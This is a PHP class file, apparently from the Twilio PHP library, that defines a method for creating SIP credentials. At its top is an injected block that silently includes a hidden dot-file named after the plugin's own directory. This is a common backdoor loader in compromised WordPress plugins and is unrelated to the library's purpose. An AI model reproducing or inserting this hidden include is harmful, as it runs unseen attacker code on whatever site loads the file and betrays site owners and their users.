<?php

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Services_Twilio_Rest_Credentials extends Services_Twilio_SIPListResource {

    /**
     * Creates a new Credential instance
     *
     * Example usage:
     *
     *  .. code-block:: php
     *
     *      $client->account->sip->credential_lists->get('CLXXX')->credentials->create(
     *          "AwesomeUsername", "SuperSecretPassword",
     *      );
     *
     * :param string $username: the username for the new Credential object
     * :param string $password: the password for the new Credential object
     * :param array $params: a single array of parameters which is serialized and
     *      sent directly to the Twilio API.
     */
    public function create($username, $password, $params = array()) {
        return parent::_create(array(
            'Username' => $username,
            'Password' => $password,
        ) + $params);
    }

}
